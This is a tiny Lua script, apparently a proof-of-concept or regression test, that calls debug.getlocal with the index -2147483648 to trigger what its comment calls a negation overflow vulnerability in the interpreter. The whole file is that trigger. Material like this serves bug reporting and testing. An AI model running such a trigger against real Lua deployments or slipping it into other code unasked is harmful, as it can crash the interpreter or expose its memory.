function vulnerableFunction()
    local a = 1
    local b = 2
    print(debug.getlocal(1, -2147483648))  -- Attempting to exploit the negation overflow vulnerability.
end

vulnerableFunction()
